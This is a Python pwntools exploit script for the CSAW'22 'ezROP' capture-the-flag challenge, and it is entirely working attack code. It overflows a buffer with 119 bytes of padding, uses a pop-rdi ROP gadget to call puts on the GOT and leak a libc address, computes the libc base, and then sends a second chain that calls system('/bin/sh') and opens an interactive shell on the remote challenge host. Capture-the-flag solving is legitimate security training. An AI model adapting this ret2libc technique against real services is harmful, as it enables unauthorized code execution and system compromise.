from pwn import *

r = remote("pwn.chal.csaw.io",5002)
#r = process("./ezROP")
e = ELF("./ezROP")
libc = ELF("./libc.so.6")
#=====================================GADGETS======================================
pop_rdi = 0x00000000004015a3            # pop rdi; ret
ret = 0x000000000040101a                # ret
#==================================================================================
exploit = b"\n" + b"A" * 119 + p64(pop_rdi) + p64(e.got.puts) + p64(e.plt.puts) + p64(ret) * 2 + p64(e.sym.main)
r.sendafter("My friend, what's your name?\n",exploit)
r.recvuntil(b"Nice to meet you, ! Welcome to CSAW'22!\n")
libc_leak = u64(r.recvuntil(b"\x7f") + b"\x00" * 2)
libc_base = libc_leak - libc.sym.puts
log.info(f"[LEAK] libc leak : {hex(libc_leak)}")
log.info(f"[LEAK] libc base : {hex(libc_base)}")
exploit = b"\n" + b"A" * 119 + p64(pop_rdi) + p64(libc_base + next(libc.search(b"/bin/sh\x00"))) + p64(ret) +p64(libc_base + libc.sym.system)
r.sendafter(b"My friend, what's your name?",exploit)
r.interactive()
